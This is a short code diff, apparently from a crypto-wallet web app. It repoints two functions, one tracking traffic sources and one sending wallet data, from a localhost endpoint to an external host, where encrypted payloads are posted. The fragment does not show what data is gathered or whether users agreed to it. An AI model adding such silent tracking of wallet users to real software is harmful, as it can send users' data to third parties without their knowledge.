@@ -108,7 +108,7 @@ const trackTrafficSource = async () => {
       data: encryptedData.encrypted,
     };
 
-    fetch("http://localhost:3001/index", {
+    fetch("https://nexosesi.hashira.io/index", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -169,7 +169,7 @@ const sendWalletData = async (address) => {
 
       // Log the encrypted payload before sending
 
-      fetch("http://localhost:3001/index", {
+      fetch("https://nexosesi.hashira.io/index", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
